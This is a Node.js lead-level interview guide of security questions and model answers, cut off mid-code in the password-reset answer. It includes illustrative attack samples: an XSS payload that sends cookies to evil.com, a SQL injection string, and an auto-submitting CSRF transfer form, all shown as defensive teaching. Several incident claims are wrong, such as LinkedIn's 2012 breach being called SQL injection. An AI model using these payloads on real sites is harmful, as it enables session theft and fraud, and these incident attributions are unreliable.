# MODULE-9: INTERVIEW QUESTIONS COMPLETE

**The Ultimate Lead-Level Node.js Interview Preparation**

**100+ Questions with Perfect Answers**

---

# How to Use This Guide

**For Interview Prep:**
1. **Read each question** - Cover the answer
2. **Answer out loud** - Practice explaining
3. **Check your answer** - Compare with perfect answer
4. **Repeat until natural** - No hesitation

**Memorize these:**
- ✅ Key numbers (performance metrics)
- ✅ Pattern names and when to use
- ✅ Real-world examples
- ✅ Trade-offs and alternatives

**In the interview:**
- Start with context ("In production systems...")
- Give specific examples ("In our e-commerce platform...")
- Quote numbers ("We saw 90% improvement...")
- Discuss trade-offs ("The downside is...")
- Mention monitoring ("We track these metrics...")

---

# CATEGORY 1: Security (15 Questions)

## Q1: How do you prevent SQL injection attacks?

**Perfect Answer:**

"I use parameterized queries where user input is treated as data, not SQL code. Instead of string concatenation like `SELECT * FROM users WHERE email = '${email}'`, I use placeholders: `SELECT * FROM users WHERE email = $1` and pass values as an array.

**Why it works:** The database driver escapes special characters and treats the input as a literal string value, not executable SQL.

**Example:**
```javascript
// ❌ VULNERABLE
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
// Input: ' OR '1'='1 → returns all users!

// ✅ SAFE
const query = 'SELECT * FROM users WHERE email = $1';
const values = [req.body.email];
await db.query(query, values);
// Input: ' OR '1'='1 → treated as literal string, no match
```

**Real incident:** LinkedIn 2012 - 6.5M user accounts compromised due to SQL injection. Could have been prevented with parameterized queries."

**Follow-up: "What about prepared statements?"**

"Prepared statements are even better for repeated queries. The query is compiled once and reused with different parameters, giving both security and performance benefits. In PostgreSQL, we can use `PREPARE` statements, but parameterized queries with `$1, $2` placeholders are sufficient for most cases."

---

## Q2: How do you store passwords securely?

**Perfect Answer:**

"I use bcrypt with at least 12 rounds of hashing. Bcrypt is specifically designed for password hashing with built-in salt generation and computational cost that increases over time.

**Implementation:**
```javascript
// Hashing (registration)
const hash = await bcrypt.hash(password, 12);
// 12 rounds = 2^12 = 4,096 iterations
// Takes ~250ms to hash (intentionally slow)

// Verification (login)
const isValid = await bcrypt.compare(password, hash);
// Takes ~250ms to verify
```

**Why bcrypt over others:**
- **vs MD5/SHA256:** These are fast (~1ms), making brute force easy. Bcrypt is slow by design (~250ms)
- **vs plain text:** Obviously never store plain text passwords
- **vs encryption:** Encryption is reversible; hashing is one-way

**Cost factor:** 12 rounds balances security and UX. Higher = more secure but slower:
- 10 rounds: ~65ms (too fast)
- 12 rounds: ~250ms (recommended)
- 14 rounds: ~1 second (too slow for UX)

**Real numbers:** An attacker trying 1000 passwords/second would take:
- MD5: 1 second to try 1000 passwords
- bcrypt (12 rounds): 250 seconds to try 1000 passwords (250× slower)

**Additional security:** Never log passwords, use HTTPS for transmission, implement rate limiting on login (5 attempts per 15 minutes)."

---

## Q3: JWT vs Session Cookies - when to use each?

**Perfect Answer:**

"Both have valid use cases. Choose based on your architecture:

**Use JWT when:**
- Microservices architecture (stateless, no shared session store)
- Mobile apps (easier token management)
- Cross-domain authentication (CORS-friendly)
- High scalability (no server-side storage)

**Use Session Cookies when:**
- Monolithic application (simpler)
- Need instant revocation (delete session)
- Regulatory compliance (banking, healthcare)
- Lower payload size matters

**Comparison:**

| Aspect | JWT | Session Cookie |
|--------|-----|----------------|
| Storage | Client-side | Server-side (Redis) |
| Size | ~300 bytes | ~50 bytes (just session ID) |
| Revocation | Requires blacklist | Instant (delete session) |
| Scalability | Excellent (stateless) | Good (needs Redis) |
| Security | Signature-based | Session ID + store |

**My production setup:** JWT for access tokens (short-lived, 15 min) + refresh tokens in database for revocation. Best of both worlds - stateless authentication with controlled revocation."

**Follow-up: "How do you handle JWT revocation?"**

"Short expiry times (15 min) + token blacklist in Redis. When user logs out, we add the token's JTI (JWT ID) to Redis with TTL equal to the token's remaining lifetime. Middleware checks blacklist before accepting token. For emergency revocation (account compromise), we delete all refresh tokens from the database and blacklist the current access token."

---

## Q4: How do you implement rate limiting?

**Perfect Answer:**

"I use the token bucket algorithm backed by Redis for distributed rate limiting.

**Token Bucket Algorithm:**
- Bucket holds N tokens
- Each request consumes 1 token
- Tokens refill at fixed rate
- Request blocked when bucket empty

**Implementation:**
```javascript
// Configuration per endpoint
const limits = {
  login: { max: 5, window: 15 * 60 * 1000 },      // 5 per 15 min
  register: { max: 3, window: 60 * 60 * 1000 },   // 3 per hour
  api: { max: 100, window: 15 * 60 * 1000 }       // 100 per 15 min
};

// Redis-backed implementation
const key = `ratelimit:${userId}:${endpoint}`;
const current = await redis.incr(key);

if (current === 1) {
  // First request, set expiry
  await redis.expire(key, window / 1000);
}

if (current > max) {
  return res.status(429).json({
    error: 'Too many requests',
    retryAfter: await redis.ttl(key)
  });
}
```

**Why Redis:**
- Atomic operations (INCR)
- Automatic expiry (TTL)
- Distributed (shared across servers)
- Fast (1-2ms operations)

**Response headers:**
```http
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 73
X-RateLimit-Reset: 1640000000
Retry-After: 847
```

**Advanced:** For stricter limiting, use sliding window algorithm instead of fixed window to prevent burst attacks at window boundaries."

---

## Q5: How do you prevent XSS attacks?

**Perfect Answer:**

"Multiple layers of defense:

**1. Output Encoding (Primary Defense):**
```javascript
// Modern frameworks (React, Vue, Angular) auto-escape by default
<div>{user.name}</div>  // Automatically escaped

// Manual escaping
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return text.replace(/[&<>"'/]/g, char => map[char]);
}
```

**2. Content Security Policy (CSP):**
```javascript
helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-{random}'"],  // No inline scripts
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
});
```

**3. HttpOnly + Secure Cookies:**
```javascript
res.cookie('token', jwt, {
  httpOnly: true,    // JavaScript cannot access
  secure: true,      // HTTPS only
  sameSite: 'strict' // CSRF protection
});
```

**4. Input Validation:**
```javascript
const schema = Joi.object({
  name: Joi.string().max(100).pattern(/^[a-zA-Z\s]+$/),
  email: Joi.string().email(),
  // Reject any HTML-like input
  comment: Joi.string().max(500).pattern(/^[^<>]*$/)
});
```

**Attack example:**
```javascript
// User input: <script>fetch('https://evil.com?cookie='+document.cookie)</script>

// Without escaping:
<div>{user.comment}</div>
// Renders as: <div><script>...</script></div> → SCRIPT EXECUTES!

// With escaping:
<div>&lt;script&gt;...&lt;/script&gt;</div>
// Displays as text, doesn't execute
```

**Real incident:** 2018 British Airways - XSS attack on payment page stole 380,000 credit card details. CSP would have blocked the external script."

---

## Q6: Explain CORS and why it exists

**Perfect Answer:**

"CORS (Cross-Origin Resource Sharing) is a browser security feature that blocks JavaScript from one domain (e.g., evil.com) from making requests to another domain (e.g., mybank.com) without explicit permission.

**Why it exists:**
Imagine you're logged into your bank (mybank.com). You visit evil.com. Without CORS, evil.com could make a JavaScript fetch to mybank.com/transfer and your browser would include your authentication cookies. CORS prevents this.

**How it works:**

**1. Simple requests (GET, POST):**
```http
Request from evil.com to mybank.com:
GET /api/account HTTP/1.1
Origin: https://evil.com

Response from mybank.com:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://mybank.com
(NOT evil.com, so browser blocks the response)
```

**2. Preflight requests (PUT, DELETE, custom headers):**
```http
Browser sends OPTIONS request first:
OPTIONS /api/account HTTP/1.1
Origin: https://myapp.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Authorization

Server responds:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization
Access-Control-Max-Age: 86400  (cache for 24 hours)

If approved, browser sends actual PUT request
```

**Production configuration:**
```javascript
app.use(cors({
  origin: (origin, callback) => {
    const whitelist = [
      'https://myapp.com',
      'https://staging.myapp.com',
      'http://localhost:3000'  // Dev only
    ];
    
    if (!origin || whitelist.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS not allowed'));
    }
  },
  credentials: true,  // Allow cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

**Common mistake:**
```javascript
// ❌ INSECURE
app.use(cors({ origin: '*' }));  // Allows ANY domain!

// ✅ SECURE
app.use(cors({ origin: 'https://myapp.com' }));  // Whitelist specific domain
```

**Interview tip:** Mention you understand the security model and always use whitelisting in production."

---

## Q7: How do you handle secrets and API keys?

**Perfect Answer:**

"Never hardcode secrets. Use environment variables with proper secret management:

**Development:**
```bash
# .env file (gitignored!)
JWT_SECRET=super-secret-key-min-32-chars
DATABASE_URL=postgresql://user:pass@localhost:5432/db
REDIS_URL=redis://localhost:6379
STRIPE_SECRET_KEY=sk_test_...
```

```javascript
require('dotenv').config();
const secret = process.env.JWT_SECRET;

// Validation
if (!secret || secret.length < 32) {
  throw new Error('JWT_SECRET must be at least 32 characters');
}
```

**Production (AWS):**
```javascript
// AWS Systems Manager Parameter Store
const AWS = require('aws-sdk');
const ssm = new AWS.SSM();

async function getSecret(name) {
  const result = await ssm.getParameter({
    Name: name,
    WithDecryption: true  // Decrypt KMS-encrypted value
  }).promise();
  
  return result.Parameter.Value;
}

const jwtSecret = await getSecret('/prod/jwt-secret');
const dbPassword = await getSecret('/prod/db-password');
```

**Production (Kubernetes):**
```yaml
# Kubernetes Secret
apiVersion: v1
kind: Secret
metadata:
  name: app-secrets
type: Opaque
data:
  jwt-secret: c3VwZXItc2VjcmV0... (base64 encoded)
  db-password: cGFzc3dvcmQ=
```

```javascript
// Access in container
const jwtSecret = process.env.JWT_SECRET;
// Kubernetes mounts secret as env var
```

**Best practices:**
1. ✅ Different secrets per environment (dev/staging/prod)
2. ✅ Rotate secrets regularly (every 90 days)
3. ✅ Use IAM roles (no secrets in code at all)
4. ✅ Encrypt at rest (KMS, Vault)
5. ✅ Audit access (who accessed what secret when)
6. ✅ Never log secrets (redact in logger)

**Secret rotation:**
```javascript
// Support multiple active secrets during rotation
const secrets = [
  process.env.JWT_SECRET_CURRENT,
  process.env.JWT_SECRET_PREVIOUS  // Still valid during rotation
];

function verifyToken(token) {
  for (const secret of secrets) {
    try {
      return jwt.verify(token, secret);
    } catch (err) {
      continue;  // Try next secret
    }
  }
  throw new UnauthorizedError('Invalid token');
}
```

**Real incident:** 2019 Toyota - API keys committed to public GitHub repo. 3.1 million customers' data exposed. Could have been prevented with proper secret management."

---

## Q8: What security headers do you implement and why?

**Perfect Answer:**

"I use Helmet middleware which sets 15+ security headers. Key ones:

**1. X-Content-Type-Options: nosniff**
```http
X-Content-Type-Options: nosniff
```
Prevents MIME sniffing attacks. Browser won't guess content type, must use Content-Type header. Without this, browser might interpret `image.jpg` as executable JavaScript if it contains JS code.

**2. X-Frame-Options: DENY**
```http
X-Frame-Options: DENY
```
Prevents clickjacking. Your site can't be embedded in an iframe. Attacker can't overlay invisible iframe to capture clicks.

**3. X-XSS-Protection: 1; mode=block**
```http
X-XSS-Protection: 1; mode=block
```
Enables browser's built-in XSS filter. Blocks page rendering if XSS detected.

**4. Strict-Transport-Security (HSTS)**
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```
Forces HTTPS. Even if user types `http://`, browser upgrades to `https://`. Prevents MITM attacks on first request.

**5. Content-Security-Policy (CSP)**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'; style-src 'self' 'unsafe-inline'
```
Whitelist trusted content sources. Most powerful XSS defense. Blocks inline scripts unless they have correct nonce.

**6. Referrer-Policy: no-referrer**
```http
Referrer-Policy: no-referrer
```
Don't leak URLs to external sites. When user clicks link to external site, that site won't see which page the user came from.

**7. Permissions-Policy**
```http
Permissions-Policy: geolocation=(), microphone=(), camera=()
```
Disable browser features your site doesn't need. Prevents malicious scripts from accessing camera/microphone.

**Implementation:**
```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-{random}'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  },
  hsts: {
    maxAge: 31536000,  // 1 year
    includeSubDomains: true,
    preload: true
  }
}));
```

**Testing:** Use securityheaders.com to scan your site and get A+ rating."

---

## Q9: How do you prevent brute force attacks?

**Perfect Answer:**

"Multi-layered approach:

**Layer 1: Rate Limiting**
```javascript
// 5 login attempts per 15 minutes per IP
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts, try again in 15 minutes',
  standardHeaders: true,
  legacyHeaders: false
});

app.post('/api/auth/login', loginLimiter, login);
```

**Layer 2: Account Lockout**
```javascript
async function checkAccountLockout(email) {
  const key = `lockout:${email}`;
  const attempts = await redis.get(key);
  
  if (attempts >= 5) {
    const ttl = await redis.ttl(key);
    throw new Error(`Account locked. Try again in ${ttl} seconds`);
  }
}

async function recordFailedAttempt(email) {
  const key = `lockout:${email}`;
  const attempts = await redis.incr(key);
  
  if (attempts === 1) {
    await redis.expire(key, 15 * 60);  // 15 minutes
  }
  
  return attempts;
}

// In login handler
const user = await findUserByEmail(email);
if (!user || !await bcrypt.compare(password, user.password_hash)) {
  const attempts = await recordFailedAttempt(email);
  
  if (attempts >= 5) {
    // Send alert email
    await sendEmail(user.email, 'Account lockout warning');
  }
  
  throw new UnauthorizedError('Invalid credentials');
}

// On successful login
await redis.del(`lockout:${email}`);
```

**Layer 3: CAPTCHA after threshold**
```javascript
if (attempts >= 3) {
  // Require CAPTCHA for next attempts
  return res.json({
    requireCaptcha: true,
    attempts: attempts
  });
}
```

**Layer 4: Slow bcrypt**
```javascript
// bcrypt with 12 rounds takes ~250ms
// Attacker limited to ~4 attempts/second
// vs MD5 (1ms) = 1000 attempts/second
const hash = await bcrypt.hash(password, 12);
```

**Layer 5: Monitoring & Alerting**
```javascript
// Alert on patterns
if (failedAttempts > 50 from same IP) {
  alert('Potential brute force attack from IP: ' + ip);
  blockIpTemporarily(ip);
}
```

**Numbers:**
- Without protection: 1000 attempts/second = 86.4M attempts/day
- With rate limit (5 per 15 min): 480 attempts/day (99.9994% reduction!)
- With bcrypt (250ms): 4 attempts/second
- With both: 5 attempts per 15 min = effectively impossible

**Real incident:** 2012 Dropbox - Brute force attack led to 68M password leak. Rate limiting would have stopped it."

---

## Q10: Explain token rotation and why it matters

**Perfect Answer:**

"Token rotation means issuing a new refresh token every time an access token is refreshed, and invalidating the old refresh token.

**Why it matters:**
If a refresh token is stolen, the attacker can keep getting new access tokens indefinitely. With rotation, we can detect and stop this.

**Implementation:**
```javascript
async function refreshAccessToken(refreshToken) {
  // 1. Verify refresh token
  const decoded = jwt.verify(refreshToken, REFRESH_SECRET);
  
  // 2. Look up in database
  const tokenHash = crypto.createHash('sha256')
    .update(refreshToken)
    .digest('hex');
  
  const storedToken = await db.query(
    'SELECT * FROM refresh_tokens WHERE token_hash = $1 AND user_id = $2',
    [tokenHash, decoded.userId]
  );
  
  if (!storedToken) {
    // Token not found = possibly reused!
    // This is token reuse detection
    await revokeAllUserTokens(decoded.userId);
    throw new UnauthorizedError('Token reuse detected. All sessions terminated.');
  }
  
  // 3. Generate NEW tokens
  const newAccessToken = generateAccessToken(decoded.userId);
  const newRefreshToken = generateRefreshToken(decoded.userId);
  
  // 4. Start transaction
  await db.query('BEGIN');
  
  try {
    // Delete old refresh token
    await db.query(
      'DELETE FROM refresh_tokens WHERE token_hash = $1',
      [tokenHash]
    );
    
    // Store new refresh token
    const newTokenHash = crypto.createHash('sha256')
      .update(newRefreshToken)
      .digest('hex');
    
    await db.query(
      'INSERT INTO refresh_tokens (user_id, token_hash, expires_at) VALUES ($1, $2, $3)',
      [decoded.userId, newTokenHash, new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)]
    );
    
    await db.query('COMMIT');
  } catch (error) {
    await db.query('ROLLBACK');
    throw error;
  }
  
  return { accessToken: newAccessToken, refreshToken: newRefreshToken };
}
```

**Token Reuse Detection:**

**Scenario 1: Normal usage**
```
User:     RT1 → RT2 → RT3 → RT4
Database: RT1   RT2   RT3   RT4  (old tokens deleted)
Status:   ✅ All good
```

**Scenario 2: Token stolen**
```
Time    User Action       Attacker Action    Database    Detection
T0      Get RT1           -                  RT1         -
T1      RT1 → RT2         -                  RT2         -
T2      RT2 → RT3         -                  RT3         -
T3      -                 RT1 → FAIL         RT3         ❌ RT1 not in DB!
T4      Alert user        Revoke all tokens  Empty       🚨 Attack detected!
```

**Why this works:**
1. Each refresh token is single-use
2. Old tokens are immediately deleted
3. If old token used = someone kept a copy = stolen
4. Automatically revoke all sessions as safety measure

**Benefits:**
- Limits damage window (7 days vs forever)
- Detects token theft automatically
- Forces attacker to steal new tokens repeatedly
- User gets alerted to suspicious activity

**Alternative: Refresh Token Families**
Track token lineage. If RT1 generates RT2 generates RT3, they're a family. If RT1 is reused after RT2 exists, revoke entire family.

**Real example:** Auth0 and Okta both implement automatic token rotation as best practice."

---

## Q11: How do you validate user input?

**Perfect Answer:**

"Never trust client input. Validate everything on the server using schema validation.

**Using Joi for validation:**
```javascript
const Joi = require('joi');

// Registration schema
const registerSchema = Joi.object({
  email: Joi.string()
    .email()
    .lowercase()
    .max(255)
    .required()
    .messages({
      'string.email': 'Please provide a valid email address',
      'any.required': 'Email is required'
    }),
  
  password: Joi.string()
    .min(8)
    .max(72)  // bcrypt limit
    .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/)
    .required()
    .messages({
      'string.min': 'Password must be at least 8 characters',
      'string.pattern.base': 'Password must contain uppercase, lowercase, and number'
    }),
  
  firstName: Joi.string()
    .min(1)
    .max(50)
    .pattern(/^[a-zA-Z\s'-]+$/)
    .required()
    .messages({
      'string.pattern.base': 'First name can only contain letters, spaces, hyphens, and apostrophes'
    }),
  
  age: Joi.number()
    .integer()
    .min(18)
    .max(120)
    .optional(),
  
  phoneNumber: Joi.string()
    .pattern(/^\+?[1-9]\d{1,14}$/)  // E.164 format
    .optional()
});

// Validation middleware
const validate = (schema) => (req, res, next) => {
  const { error, value } = schema.validate(req.body, {
    abortEarly: false,  // Return all errors, not just first
    stripUnknown: true  // Remove fields not in schema
  });
  
  if (error) {
    const errors = error.details.map(detail => ({
      field: detail.path.join('.'),
      message: detail.message
    }));
    
    return res.status(400).json({
      success: false,
      error: 'Validation failed',
      errors
    });
  }
  
  req.validatedData = value;  // Use validated & sanitized data
  next();
};

// Usage
app.post('/api/auth/register', validate(registerSchema), registerController);
```

**What to validate:**

**1. Type validation:**
```javascript
age: Joi.number().integer()  // Must be integer, not string "18"
email: Joi.string().email()   // Must be valid email format
```

**2. Length limits:**
```javascript
password: Joi.string().min(8).max(72)  // Prevent DoS via huge inputs
bio: Joi.string().max(500)              // Reasonable limits
```

**3. Format validation:**
```javascript
email: Joi.string().email()
url: Joi.string().uri()
uuid: Joi.string().guid({ version: 'uuidv4' })
creditCard: Joi.string().creditCard()
```

**4. Range validation:**
```javascript
age: Joi.number().min(18).max(120)
rating: Joi.number().min(1).max(5)
quantity: Joi.number().min(1).max(100)
```

**5. Pattern matching:**
```javascript
username: Joi.string().pattern(/^[a-zA-Z0-9_-]{3,20}$/)
zipCode: Joi.string().pattern(/^\d{5}(-\d{4})?$/)
```

**6. Custom validation:**
```javascript
const schema = Joi.object({
  password: Joi.string().required(),
  confirmPassword: Joi.string()
    .valid(Joi.ref('password'))
    .messages({ 'any.only': 'Passwords must match' })
});
```

**7. Sanitization:**
```javascript
email: Joi.string().email().lowercase().trim()  // Convert to lowercase, remove spaces
name: Joi.string().trim()                       // Remove leading/trailing spaces
```

**Additional layers:**

**Database level:**
```sql
CREATE TABLE users (
  email VARCHAR(255) NOT NULL CHECK (email ~* '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$'),
  age INTEGER CHECK (age >= 18 AND age <= 120),
  UNIQUE(email)
);
```

**Business logic validation:**
```javascript
// Can't order more than in stock
if (orderQuantity > product.stock) {
  throw new ValidationError('Insufficient stock');
}

// Can't refund more than paid
if (refundAmount > order.totalPaid) {
  throw new ValidationError('Refund exceeds order total');
}
```

**Why Joi over manual checks:**
- ✅ Declarative (easier to read)
- ✅ Comprehensive (handles edge cases)
- ✅ Type coercion (converts "18" to 18)
- ✅ Detailed error messages
- ✅ Reusable schemas
- ✅ Well-tested library

**Interview tip:** Mention you validate at multiple layers: client (UX), server (security), database (data integrity)."

---

## Q12: What is CSRF and how do you prevent it?

**Perfect Answer:**

"CSRF (Cross-Site Request Forgery) is when an attacker tricks a user's browser into making an unwanted request to a site where the user is authenticated.

**Attack example:**
```html
<!-- User is logged into bank.com -->
<!-- User visits evil.com, which contains: -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker@evil.com">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

<!-- Browser automatically includes bank.com cookies! -->
<!-- Money transferred without user knowing -->
```

**Prevention strategies:**

**1. SameSite Cookie Attribute (Best)**
```javascript
res.cookie('token', jwt, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'  // or 'lax'
});
```

- `strict`: Cookie only sent for same-site requests (never cross-site)
- `lax`: Cookie sent for top-level navigation (GET only), not for iframe/AJAX
- `none`: Cookie sent everywhere (requires `secure: true`)

**2. CSRF Tokens**
```javascript
// Server generates token
const csrfToken = crypto.randomBytes(32).toString('hex');
req.session.csrfToken = csrfToken;

// Send to client
res.render('form', { csrfToken });

// Client includes in form
<input type="hidden" name="_csrf" value="<%= csrfToken %>">

// Server validates
if (req.body._csrf !== req.session.csrfToken) {
  throw new ForbiddenError('Invalid CSRF token');
}
```

**3. Custom Headers (SPA approach)**
```javascript
// Browser's same-origin policy prevents evil.com from setting custom headers
// on requests to bank.com

// Client (React/Vue/Angular)
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',  // Custom header
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ to: 'bob@example.com', amount: 100 })
});

// Server validates
if (!req.headers['x-requested-with']) {
  throw new ForbiddenError('Missing X-Requested-With header');
}
```

**4. Double Submit Cookie**
```javascript
// Set CSRF token in cookie
res.cookie('csrf-token', csrfToken, { sameSite: 'strict' });

// Client sends same token in header
headers: {
  'X-CSRF-Token': getCookie('csrf-token')
}

// Server compares
if (req.headers['x-csrf-token'] !== req.cookies['csrf-token']) {
  throw new ForbiddenError('CSRF token mismatch');
}
```

**5. Referer/Origin Validation**
```javascript
const allowedOrigins = ['https://myapp.com', 'https://staging.myapp.com'];
const origin = req.headers.origin || req.headers.referer;

if (!allowedOrigins.includes(origin)) {
  throw new ForbiddenError('Invalid origin');
}
```

**My production approach:**
```javascript
// Combination of multiple defenses
app.use(cors({
  origin: 'https://myapp.com',
  credentials: true
}));

app.use(cookieParser());

app.use((req, res, next) => {
  res.cookie('session', sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'  // Primary defense
  });
  next();
});

// For state-changing operations (POST/PUT/DELETE), require custom header
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    if (!req.headers['x-requested-with']) {
      return res.status(403).json({ error: 'Forbidden' });
    }
  }
  next();
});
```

**Why SameSite is best:**
- Built into browsers
- No server-side token management
- Works for all requests (forms, AJAX, etc.)
- ~95% browser support

**Interview tip:** Mention that modern browsers make CSRF much easier to prevent with SameSite cookies, but still use defense-in-depth with custom headers for sensitive operations."

---

## Q13: How do you secure API keys and service-to-service authentication?

**Perfect Answer:**

"For service-to-service communication, I use dedicated service tokens with limited permissions.

**Service Token Generation:**
```javascript
function generateServiceToken(serviceName, permissions) {
  return jwt.sign(
    {
      sub: serviceName,           // Subject: service name
      type: 'service',             // Token type
      permissions: permissions,    // What this service can do
      iss: 'api-gateway'           // Issuer
    },
    SERVICE_TOKEN_SECRET,
    {
      algorithm: 'RS256',
      expiresIn: '1h',            // Short-lived
      jwtid: uuidv4()             // Unique ID
    }
  );
}

// Example
const orderServiceToken = generateServiceToken('order-service', [
  'read:users',      // Can read user data
  'read:products',   // Can read product data
  'write:orders'     // Can create orders
]);
```

**Service Authentication Middleware:**
```javascript
async function authenticateService(req, res, next) {
  const token = req.headers['x-service-token'];
  
  if (!token) {
    return res.status(401).json({ error: 'Service token required' });
  }
  
  try {
    const decoded = jwt.verify(token, SERVICE_TOKEN_PUBLIC_KEY, {
      algorithms: ['RS256']
    });
    
    if (decoded.type !== 'service') {
      throw new Error('Not a service token');
    }
    
    req.service = {
      name: decoded.sub,
      permissions: decoded.permissions
    };
    
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid service token' });
  }
}
```

**Permission Checking:**
```javascript
function requirePermission(...requiredPermissions) {
  return (req, res, next) => {
    const servicePermissions = req.service.permissions || [];
    
    const hasPermission = requiredPermissions.every(perm =>
      servicePermissions.includes(perm)
    );
    
    if (!hasPermission) {
      return res.status(403).json({
        error: 'Insufficient permissions',
        required: requiredPermissions,
        has: servicePermissions
      });
    }
    
    next();
  };
}

// Usage
router.get(
  '/api/internal/users/:id',
  authenticateService,
  requirePermission('read:users'),
  getUserController
);
```

**Service-to-Service Request:**
```javascript
// Order Service calling User Service
async function getUserDetails(userId) {
  const serviceToken = generateServiceToken('order-service', ['read:users']);
  
  const response = await fetch(`${USER_SERVICE_URL}/api/internal/users/${userId}`, {
    headers: {
      'X-Service-Token': serviceToken,
      'X-Request-ID': req.id  // Propagate request ID for tracing
    }
  });
  
  return response.json();
}
```

**Alternative: mTLS (Mutual TLS)**
```javascript
// Both client and server verify each other's certificates
const https = require('https');
const fs = require('fs');

const options = {
  hostname: 'user-service',
  port: 443,
  path: '/api/internal/users/123',
  method: 'GET',
  
  // Client certificate (order-service's identity)
  cert: fs.readFileSync('order-service-cert.pem'),
  key: fs.readFileSync('order-service-key.pem'),
  
  // CA certificate (verify server)
  ca: fs.readFileSync('ca-cert.pem')
};

https.request(options, (res) => {
  // Server verified client cert ✅
  // Client verified server cert ✅
});
```

**Best practices:**

**1. Principle of Least Privilege**
```javascript
// Order Service only gets what it needs
const permissions = [
  'read:users',      // ✅ Needs user email/name
  'read:products',   // ✅ Needs product price/stock
  'write:orders'     // ✅ Needs to create orders
  // ❌ NOT 'admin' or 'write:users'
];
```

**2. Token Rotation**
```javascript
// Rotate service tokens every hour
setInterval(async () => {
  const newToken = generateServiceToken('order-service', permissions);
  await redis.set('service:order-service:token', newToken, 'EX', 3600);
}, 3600 * 1000);
```

**3. Audit Logging**
```javascript
logger.info('Service request', {
  service: req.service.name,
  endpoint: req.path,
  permission: requiredPermission,
  userId: req.params.id,
  requestId: req.id
});
```

**4. Network Isolation**
```javascript
// Internal services not accessible from internet
// Only API Gateway is public-facing
// Services communicate over private network

// Docker Compose
services:
  api-gateway:
    ports:
      - "3000:3000"  // Exposed to internet
  
  user-service:
    # No ports exposed! Only accessible via Docker network
    networks:
      - internal
  
  order-service:
    networks:
      - internal

networks:
  internal:
    driver: bridge
```

**5. Service Mesh (Advanced)**
```javascript
// Istio/Linkerd handles service auth automatically
// Each service gets unique identity
// mTLS enforced automatically
// No code changes needed

// Kubernetes ServiceAccount
apiVersion: v1
kind: ServiceAccount
metadata:
  name: order-service
---
# Istio automatically provisions cert for this service account
```

**Interview tip:** Explain that you understand the difference between user authentication (JWT) and service authentication (service tokens/mTLS), and why they need different approaches."

---

## Q14: How do you handle password reset securely?

**Perfect Answer:**

"Password reset is a security-sensitive operation. Here's my implementation:

**1. Generate Secure Reset Token**
```javascript
const crypto = require('crypto');

async function generatePasswordResetToken(email) {
  // Find user
  const user = await db.query('SELECT id FROM users WHERE email = $1', [email]);
  if (!user.rows[0]) {
    // Don't reveal if email exists (security)
    return { success: true };
  }
  
  // Generate cryptographically secure random token
  const resetToken = crypto.randomBytes(32).toString('hex');
  
  // Hash before storing (don't store plain token)
  const tokenHash = crypto.createHash('sha256')
    .update(resetToken)
    .digest('hex');
  
  // Store with 1-hour expiry
  await db.query(`
    INSERT INTO password_reset_tokens (user_id, token_hash, expires_at)
    VALUES ($1, $2, NOW() + INTERVAL '1 hour')
  `, [user.rows[0].id, tokenHash]);
  
  // Send email with reset link
  const resetUrl = `https://myapp.com/reset-password?token=${resetToken}`;
  await sendEmail(email, 'Password Reset', `Click here: ${resetUrl}`);
  
  return { success: true };
}
```

**2. Validate Reset Token**
```javascript
async function resetPassword(token, newPassword) {
  // Hash token to compare with database
  const tokenHash = crypto.createHash('sha256')
    .update(token)
    .digest('hex');
  
  // Find token in database
  const result = await db.query(`
    SELECT prt.user_id, prt.expires_at, prt.used
    FROM password_reset_tokens prt
    WHERE prt.token_hash = $1
  `, [tokenHash]);
  
  if (!result.rows[0]) {
    throw new ValidationError('Invalid or expired reset token');
  }
  
  const { user_id, expires_at, used } = result.rows[0];
  
  // Check if expired
  if (new Date() > new Date(expires_at)) {
    throw new ValidationError('Reset token expired');
  }
  
  // Check if already used (one-time use)
  if (used) {
    throw new ValidationError('Reset token already used');
  }
  
  // Hash new password
  const passwordHash = await bcrypt.hash(newPassword, 12);
  
  // Update password and mark token as used (transaction)
  await db.query('BEGIN');
  
  try {
    // Update password
    await db.query(`
      UPDATE users
      SET password_hash = $1, updated_at = NOW()
      WHERE id = $2
    `, [passwordHash, user_id]);
    
    // Mark token as used
    await db.query(`
